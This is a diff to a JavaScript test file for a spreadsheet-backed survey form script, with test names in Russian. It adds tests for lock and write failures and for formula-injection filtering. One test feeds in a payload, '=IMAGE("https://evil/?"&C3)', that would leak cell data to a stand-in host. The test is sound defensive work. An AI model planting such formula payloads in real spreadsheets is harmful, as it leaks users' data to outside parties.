@@ -7,7 +7,7 @@ import vm from 'node:vm';
 const code = readFileSync(new URL('../gas/Code.gs', import.meta.url), 'utf8');
 const html = readFileSync(new URL('../src/index.html', import.meta.url), 'utf8');
 
-function load() {
+function load(opt = {}) {
   const rows = [];
   const range = (r, c, nr = 1, nc = 1) => ({
     getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => rows[r - 1 + i]?.[c - 1 + j] ?? '')),
@@ -16,19 +16,19 @@ function load() {
   });
   const sheet = {
     getLastRow: () => rows.length,
-    appendRow: r => rows.push([...r]),
+    appendRow: r => { if (opt.failWrite) throw new Error('Service Spreadsheets failed'); rows.push([...r]); },
     setFrozenRows() {},
     getRange: (a, ...rest) => typeof a === 'string' ? range(1, 1) : range(a, ...rest),
   };
-  let created = 0;
+  let created = 0, released = 0;
   const ctx = {
     SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: () => (created ? sheet : null), insertSheet: () => (created++, sheet) }) },
-    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
+    LockService: { getScriptLock: () => ({ tryLock: () => !opt.busy, waitLock() { if (opt.busy) throw new Error('Lock timeout'); }, releaseLock() { released++; } }) },
     ContentService: { MimeType: { JSON: 'json' }, createTextOutput: t => ({ text: t, setMimeType() { return this; } }) },
   };
   vm.createContext(ctx);
   vm.runInContext(code, ctx);
-  return { ctx, rows };
+  return { ctx, rows, released: () => released };
 }
 
 // дата создаётся внутри vm-контекста со своим Date, поэтому instanceof не годится
@@ -85,4 +85,24 @@ test('вопросы в таблице дословно совпадают с в
   for (let i = 1; i <= 10; i++) assert.match(html, new RegExp(`<textarea id="q${i}" name="q${i}"`));
   assert.match(html, /name="name"/);
   assert.match(html, /name="website"/);
+});
+
+test('ID анкеты не может стать формулой: посторонний формат отбрасывается', () => {
+  const { ctx, rows } = load();
+  assert.deepEqual(reply(ctx.doPost(form({ id: '=IMAGE("https://evil/?"&C3)' }))), { ok: true });
+  assert.equal(rows[1][13], '');
+  ctx.doPost(form({ id: '0b0e7a52-6c1f-4c0e-9d53-1f2a3b4c5d6e', name: 'Мария' }));
+  assert.equal(rows[2][13], '0b0e7a52-6c1f-4c0e-9d53-1f2a3b4c5d6e');
+  for (const row of rows.slice(1)) for (const cell of row) assert.ok(typeof cell !== 'string' || !/^[=+@-]/.test(cell), 'формула в ячейке: ' + cell);
+});
+
+test('сбой записи и занятая блокировка возвращают {ok:false}, а не исключение', () => {
+  const a = load({ failWrite: true });
+  const r1 = reply(a.ctx.doPost(form()));
+  assert.equal(r1.ok, false);
+  assert.equal(a.released(), 1);
+  const b = load({ busy: true });
+  const r2 = reply(b.ctx.doPost(form()));
+  assert.equal(r2.ok, false);
+  assert.equal(b.rows.length, 0);
 });
